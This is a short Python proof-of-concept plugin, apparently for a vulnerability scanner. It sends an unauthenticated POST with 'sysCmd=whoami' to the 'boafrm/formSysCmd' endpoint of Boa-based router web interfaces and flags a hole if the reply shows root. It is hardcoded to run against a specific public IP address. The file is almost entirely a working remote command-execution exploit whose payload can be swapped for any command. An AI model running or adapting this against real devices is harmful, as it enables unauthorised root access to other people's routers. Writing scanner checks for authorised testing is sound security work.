#!/usr/bin/env python
#-*- encoding:utf-8 -*-

import re
import urlparse
def assign(service, arg):
    if service == "www":
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)

def audit(arg):
    path = "boafrm/formSysCmd"
    payload = "sysCmd=whoami&apply=Apply&msg="
    code, head, res, errcode, _ = curl.curl2(arg + path, post=payload)
    if code == 200 and 'root' in res and '<' not in res:
        security_hole(arg+path)

if __name__ == '__main__':
    from dummy import *
    audit(assign('www', 'http://84.54.185.212/')[1])